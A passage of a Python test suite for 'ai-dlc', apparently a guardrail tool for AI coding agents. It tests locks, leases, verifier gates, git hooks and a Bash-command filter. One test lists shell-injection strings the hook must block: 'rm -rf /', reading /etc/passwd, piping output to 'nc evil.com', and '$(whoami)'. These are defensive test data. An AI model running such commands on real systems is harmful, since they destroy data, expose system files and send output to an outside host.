            self.assertIn("repo_worker assignment", blocked["reason"])

    def test_assignment_claim_is_atomic_per_repo(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)

            first = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            second = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            lease = agent_claim(root, first["id"], session_id="sess-1")
            self.assertEqual(lease["session_id"], "sess-1")

            with self.assertRaisesRegex(ValueError, "lock already held"):
                agent_claim(root, second["id"], session_id="sess-2")

            lock = json.loads((root.parent / ".local" / "ai-dlc" / "locks" / "repo-web.lock").read_text(encoding="utf-8"))
            self.assertEqual(lock["session_id"], "sess-1")
            self.assertFalse((root.parent / ".local" / "ai-dlc" / "leases" / "sess-2.json").exists())
            self.assertEqual(lock_list(root)[0]["session_id"], "sess-1")

    def test_agent_release_requires_owner_session(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)
            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            agent_claim(root, assignment["id"], session_id="sess-owner")
            with self.assertRaisesRegex(ValueError, "lease not found|different session|does not own"):
                agent_release(root, assignment["id"], session_id="sess-other")
            with self.assertRaisesRegex(ValueError, "different session"):
                lock_release(root, "repo-web.lock", session_id="sess-other")
            agent_release(root, assignment["id"], session_id="sess-owner")
            self.assertFalse((root.parent / ".local" / "ai-dlc" / "locks" / "repo-web.lock").exists())

    def test_control_plane_claim_creates_named_lock(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            assignment = assignment_create(root, "dlc_plan_writer", None, [], None)
            lease = agent_claim(root, assignment["id"], session_id="sess-plan")
            validate_required(lease)
            self.assertEqual(lease["lock_scope"], "plan.lock")
            locks = lock_list(root)
            self.assertTrue(any(lock["name"] == "plan.lock" for lock in locks))
            agent_release(root, assignment["id"], session_id="sess-plan")

    def test_worker_report_does_not_pollute_tracked_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)
            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            agent_report(root, assignment["id"], "reported")
            evidence = read_yaml(root / "ai-dlc" / "evidence" / "LIN-123.yaml")
            self.assertNotIn(f"assignment:{assignment['id']}", evidence["items"])
            self.assertEqual(evidence.get("verifier_log", []), [])

    def test_overlay_repair_restores_gitfile(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            gitfile = root / "web" / ".git"
            backup = root.parent / ".local" / "overlay" / "gitfiles" / "web.gitfile"
            gitfile.unlink()
            backup.write_text("gitdir: repaired\n", encoding="utf-8")
            repaired = overlay_repair(root)
            self.assertIn("web", repaired["restored"])
            self.assertTrue(gitfile.exists())

    def test_verify_gate_records_repo_state_and_child_pre_push_requires_matching_head(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)

            web = root / "web"
            (web / "README.md").write_text("verified web change\n", encoding="utf-8")
            run(["git", "add", "README.md"], web)
            run(["git", "commit", "-m", "web verified change"], web)

            result = verify_gate(root, "WI-001", "verified web head")
            self.assertEqual(result["state"], "passing")
            evidence = read_yaml(root / "ai-dlc" / "evidence" / "LIN-123.yaml")
            self.assertEqual(evidence["items"]["WI-001"]["repo"], "web")
            self.assertTrue(evidence["items"]["WI-001"]["tree_clean"])

            ok_push = run([str(child_hook(web, "pre-push"))], web)
            self.assertEqual(ok_push.returncode, 0)

            (web / "README.md").write_text("drift after verify\n", encoding="utf-8")
            run(["git", "add", "README.md"], web)
            run(["git", "commit", "-m", "web drift"], web)
            blocked_push = run([str(child_hook(web, "pre-push"))], web, check=False)
            self.assertNotEqual(blocked_push.returncode, 0)
            self.assertIn("not covered by passing verifier evidence", blocked_push.stdout + blocked_push.stderr)

    def test_work_item_cancel_and_status(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            cancelled = work_item_cancel(root, "WI-001", "no longer needed")
            self.assertEqual(cancelled["state"], "cancelled")
            status = workspace_status(root)
            self.assertEqual(status["active_item"], None)
            self.assertEqual(status["workspace_id"], "LIN-123")

    def test_finish_requires_no_claimed_assignments(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            self.prepare_active_web_item(root)
            bootstrap(root)
            assignment = assignment_create(root, "dlc_repo_worker", "web", ["web/README.md"], "WI-001")
            agent_claim(root, assignment["id"], session_id="sess-web")
            with self.assertRaisesRegex(ValueError, "claimed assignments"):
                finish(root)

    def test_integration_overlay_commit_hooks_root_export_and_git_shim(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            root, _ = self.create_workspace(tmp_path)
            run(["git", "config", "commit.gpgsign", "false"], root)
            run(["git", "add", "workspace.yaml", "ai-dlc"], root)
            run(["git", "commit", "-m", "root metadata"], root)
            run(["git", "branch", "root-export-target", "HEAD~2"], root)

            web_readme = root / "web" / "README.md"
            web_readme.write_text("web changed\n", encoding="utf-8")
            root_status = run(["git", "status", "--short"], root).stdout
            child_status = run(["git", "status", "--short"], root / "web").stdout
            self.assertIn("web/README.md", root_status)
            self.assertIn("README.md", child_status)

            run(["git", "config", "commit.gpgsign", "false"], root / "web")
            run(["git", "add", "README.md"], root / "web")
            run(["git", "commit", "-m", "web update"], root / "web")

            web_readme.write_text("web changed twice\n", encoding="utf-8")
            run(["git", "add", "web/README.md"], root)
            commit_result = run(["git", "commit", "-m", "root commit"], root, check=False)
            self.assertNotEqual(commit_result.returncode, 0)
            self.assertIn("must not commit embedded subrepo paths", commit_result.stdout + commit_result.stderr)
            run(["git", "reset", "HEAD", "web/README.md"], root)

            remote = tmp_path / "root-remote.git"
            run(["git", "init", "--bare", str(remote)], tmp_path)
            run(["git", "remote", "add", "origin", str(remote)], root)
            push_result = run(["git", "push", "-u", "origin", "main"], root, check=False)
            self.assertNotEqual(push_result.returncode, 0)
            self.assertIn("overlay branch must not be pushed", push_result.stdout + push_result.stderr)

            exported = Path(root_export(root, "root-export-target"))
            self.assertFalse((exported / "web").exists())
            self.assertFalse((exported / "backend").exists())
            self.assertTrue((exported / "workspace.yaml").exists())
            export_pre_push = run([str(root / ".git" / "hooks" / "pre-push")], exported, check=False)
            self.assertEqual(export_pre_push.returncode, 0, export_pre_push.stdout + export_pre_push.stderr)

            shim_dir = tmp_path / "shim-bin"
            run(
                ["python3", str(Path("packages/codex/.codex/ai-dlc/bin/ai-dlc").resolve()), "git-shim", "install", "--destination", str(shim_dir)],
                root,
            )
            self.assertTrue((shim_dir / "git").exists())
            blocked_restore = run([str(shim_dir / "git"), "restore", "--", "web"], root, check=False)
            self.assertNotEqual(blocked_restore.returncode, 0)
            self.assertIn("discard/restore is blocked", blocked_restore.stderr)
            allowed_status = run([str(shim_dir / "git"), "status", "--short"], root)
            self.assertIn("web/README.md", allowed_status.stdout)


    def test_install_project_hooks_works_in_git_worktree(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            main_repo = tmp_path / "main-repo"
            self.init_repo(main_repo, "main\n")
            worktree_path = tmp_path / "worktree"
            run(["git", "worktree", "add", str(worktree_path), "-b", "wt-branch"], main_repo)
            git_entry = worktree_path / ".git"
            self.assertTrue(git_entry.is_file(), ".git should be a file in a worktree")
            install_project_hooks(worktree_path)
            git_dir = run(["git", "rev-parse", "--git-dir"], worktree_path).stdout.strip()
            resolved = (worktree_path / git_dir).resolve() if not os.path.isabs(git_dir) else Path(git_dir)
            self.assertTrue((resolved / "hooks" / "pre-commit").exists())
            self.assertTrue((resolved / "hooks" / "pre-push").exists())

    def test_hook_allows_all_aidlc_commands_universally(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            runtime_commands = [
                "ai-dlc status",
                "ai-dlc inspect",
                "ai-dlc transition plan_ready",
                "ai-dlc assignment create --role dlc_repo_worker --repo web",
                "ai-dlc agent-claim A-001 --session sess-1",
                "ai-dlc agent-report A-001 --status reported",
                "ai-dlc agent-release A-001 --session sess-1",
                "ai-dlc verify-gate WI-001",
                "ai-dlc work-item activate WI-001",
                "ai-dlc evidence record --item WI-001",
                "ai-dlc bootstrap",
                "ai-dlc validate",
                "ai-dlc validate-overlay",
                "ai-dlc overlay-init",
                "ai-dlc overlay-repair",
                "ai-dlc clean-state-check",
                "ai-dlc deadlock-check",
                "ai-dlc finish",
                "ai-dlc lock list",
            ]
            for cmd in runtime_commands:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    result = self.dispatch_with_payload(root, payload)
                    self.assertEqual(result, {}, f"Expected allow for: {cmd}")

    def test_hook_blocks_aidlc_with_shell_injection(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root, _ = self.create_workspace(Path(tmp))
            dangerous = [
                "ai-dlc status && rm -rf /",
                "ai-dlc status; cat /etc/passwd",
                "ai-dlc status | nc evil.com 1234",
                "ai-dlc status $(whoami)",
            ]
            for cmd in dangerous:
                with self.subTest(cmd=cmd):
                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                    result = self.dispatch_with_payload(root, payload)
                    self.assertIn("block", str(result), f"Expected block for: {cmd}")

    def test_hook_allows_overlay_init_and_bootstrap_as_bootstrap_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ai-dlc").mkdir()
            (root / "ai-dlc" / "project-metadata.yaml").write_text("id: test\n", encoding="utf-8")
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = true\n", encoding="utf-8")
            for cmd in ("ai-dlc overlay-init", "ai-dlc overlay-repair", "ai-dlc bootstrap"):
                payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
                result = self.dispatch_with_payload(root, payload)
                self.assertEqual(result, {}, f"Expected allow for: {cmd}")

    def test_hook_allows_install_sh_dry_run_but_requires_approval_for_normal_install(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            fake_home = root / "home"
            fake_home_config = fake_home / ".codex" / "config.toml"
            fake_home_config.parent.mkdir(parents=True)
            fake_home_config.write_text(
                "\n".join([
                    "[guardrails]",
                    "subagent_required = true",
                    'bootstrap_extra_commands = ["./install.sh codex"]',
                ]),
                encoding="utf-8",
            )
            repo_root = Path(__file__).resolve().parents[1]

            commands = [
                "./install.sh -n codex",
                f"{repo_root / 'install.sh'} -n codex",
            ]
            with patch("aidlc.hooks._find_codex_config", return_value=None):
                for command in commands:
                    with self.subTest(command=command):
                        result = self.dispatch_with_payload(
                            repo_root,
                            {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": command}},
                            {"HOME": str(fake_home)},
                        )
                        self.assertEqual(result, {}, f"Expected allow for: {command}")

                normal_install = self.dispatch_with_payload(
                    repo_root,
                    {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "./install.sh codex"}},
                    {"HOME": str(fake_home)},
                )
                approved_install = self.dispatch_with_payload(
                    repo_root,
                    {
                        "hook_event_name": "PreToolUse",
                        "tool_name": "Bash",
                        "tool_input": {"cmd": "AI_DLC_INSTALL_APPROVED=1 ./install.sh codex"},
                    },
                    {"HOME": str(fake_home)},
                )
                approved_absolute_install = self.dispatch_with_payload(
                    repo_root,
                    {
                        "hook_event_name": "PreToolUse",
                        "tool_name": "Bash",
                        "tool_input": {"cmd": f"AI_DLC_INSTALL_APPROVED=1 {repo_root / 'install.sh'} codex"},
                    },
                    {"HOME": str(fake_home)},
                )
                unconfigured_install = self.dispatch_with_payload(
                    repo_root,
                    {
                        "hook_event_name": "PreToolUse",
                        "tool_name": "Bash",
                        "tool_input": {"cmd": "AI_DLC_INSTALL_APPROVED=1 ./install.sh agents"},
                    },
                    {"HOME": str(fake_home)},
                )
            self.assertEqual(normal_install["decision"], "block")
            self.assertIn("mutating Bash", normal_install["reason"])
            self.assertEqual(approved_install, {})
            self.assertEqual(approved_absolute_install, {})
            self.assertEqual(unconfigured_install["decision"], "block")
            self.assertIn("mutating Bash", unconfigured_install["reason"])

    def test_subagent_required_false_overrides_project_metadata(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ai-dlc").mkdir()
            (root / "ai-dlc" / "project-metadata.yaml").write_text("id: test\n", encoding="utf-8")
            (root / ".codex").mkdir()
            (root / ".codex" / "config.toml").write_text("[guardrails]\nsubagent_required = false\n", encoding="utf-8")

            mutating_bash = self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": "mkdir -p scratch"}},
            )
            self.assertEqual(mutating_bash, {}, "subagent_required=false should allow mutating bash")

            edit = self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": str(root / "README.md")}},
            )
            self.assertEqual(edit, {}, "subagent_required=false should allow edits")

            apply_patch = self.dispatch_with_payload(
                root,
                {"hook_event_name": "PreToolUse", "tool_name": "apply_patch", "tool_input": {"cmd": "*** Update File: ai-dlc/docs/report.md\nfoo"}},
            )
            self.assertEqual(apply_patch, {}, "subagent_required=false should allow apply_patch")


class AidlcCliInstallTest(unittest.TestCase):
    def test_fake_home_install_and_doctor(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            fake_home = Path(tmp) / "home"
            fake_home.mkdir()
            env = os.environ.copy()
            env["HOME"] = str(fake_home)
            install = subprocess.run(
                [str(Path("install.sh").resolve()), "codex", "agents"],
                cwd=Path(__file__).resolve().parents[1],
                env=env,
                check=True,
                capture_output=True,
                text=True,
            )
            self.assertIn("Installed: codex", install.stdout)
            doctor = subprocess.run(
                ["python3", str(Path("packages/codex/.codex/ai-dlc/bin/ai-dlc").resolve()), "doctor"],
                cwd=Path(__file__).resolve().parents[1],
                env=env,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(doctor.returncode, 0, doctor.stdout + doctor.stderr)
            data = json.loads(doctor.stdout)
            self.assertTrue(all(data.values()))


if __name__ == "__main__":
    unittest.main()
